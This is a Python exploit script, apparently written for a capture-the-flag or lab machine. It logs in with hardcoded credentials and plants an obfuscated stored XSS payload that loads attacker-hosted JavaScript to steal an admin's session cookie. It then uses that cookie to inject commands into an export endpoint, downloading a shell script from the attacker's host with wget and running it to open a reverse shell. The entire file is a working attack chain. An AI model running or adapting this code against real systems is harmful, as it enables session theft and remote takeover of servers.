import requests
from urllib.parse import urljoin
import traceback
import ipaddress
import argparse

def login(target):
    """
    Login with RickA:nevergonnagiveyouup and get the normal user session cookie
    """
    url = urljoin(target, "/login")
    headers = {
        "User-Agent": "Linux"
    }
    data = {
        "username": "RickA",
        "password": "nevergonnagiveyouup"
    }
    try:
        print("[*] Sending the login request...")
        response = requests.post(url, data=data, headers=headers, allow_redirects=False)
        raw_cookie = response.headers.get("set-cookie")
        if raw_cookie:
            session_raw = raw_cookie.split(';')[0]  # e.g., connect.sid=s%3A...
            name, value = session_raw.split('=', 1)
            session_cookie = {name: value}
            print("[+] Normal user session cookie:", session_cookie)
            return session_cookie
        else:
            print("[-] No set-cookie header received.")
            return None
    except Exception as e:
        print("[-] Failed to send the login request:", e)
        traceback.print_exc()


def ascii_to_codes(payload):
    return ','.join(str(ord(char)) for char in payload)


def HijackAdminSession(target, lhost):
    """
    You must have a python server running on port 8000
    """
    url = urljoin(target, "/agent/addNote")
    headers = {
        "User-Agent": "Linux"
    }
    cookies = login(target)
    txt = """document.write('<script src="http://%s:8000/file.js"></script>')""" % (lhost)
    ascii = ascii_to_codes(txt)
    data = {
        "uuid": "8dd841ff-3f44-4f2b-9324-9a833e2c6b65",
        "body": """<img src="x/><script>eval(String.fromCharCode(%s));</script>">""" % (ascii)
    }
    try:
        requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)
        print("[+] XSS payload sent, please wait till it fires in the admin's browser then check the response received on your Python server (it usually takes 1 ~ 2 minutes)")
        adminSessionToken = input("[?] Please input the admin's session cookie received (the value of `connect.sid` cookie parameter. (e.g, \"s%3A5cae...KLaTUQwQ\")): ")
        return adminSessionToken
    except Exception as e:
        print("[-] Failed to send the XSS payload: ", e)
        traceback.print_exc()

def convertIPToHex(add):
    ip = ipaddress.IPv4Address(add)
    hex_ip = f'0x{int(ip):08x}'
    return hex_ip # Example: 10.10.16.8 --> 0x0a0a1008

def trigger_rce(target, lhost):
    """
    You must have a bash reverse shell script hosted on a python server running on port 80
    And start your netcat listener to receive the reverse connection from the server
    """
    lhostInHex = convertIPToHex(lhost)
    url = urljoin(target, f"/admin/export?table=notes%26wget+{lhostInHex}/shell")
    adminSessionCookie = HijackAdminSession(target, lhost)
    cookies = {
        "connect.sid": adminSessionCookie
    }
    headers = {
        "User-Agent": "Linux"
    }
    try:
        print("[+] Uploading the reverse shell script to the target machine...")
        requests.get(url, cookies=cookies, headers=headers)
        url = urljoin(target, "/admin/export?table=notes%26bash+shell")
        try:
            print("[+] Triggering the reverse shell. Check you listener.")
            requests.get(url, cookies=cookies, headers=headers)
        except Exception as e:
            print("[-] Failed to trigger the reverse shell: ", e)
            traceback.print_exc()

    except Exception as e:
        print("[-] Failed to upload the reverse shell script to the target machine: ", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("target", help="target URL or IP. (e.g, http://10.10.10.25:8080)")
    parser.add_argument("lhost", help="Listener IP adderss. (e.g, 10.10.16.8)")
    args = parser.parse_args()

    trigger_rce(args.target, args.lhost)

if __name__ == "__main__":
    main()
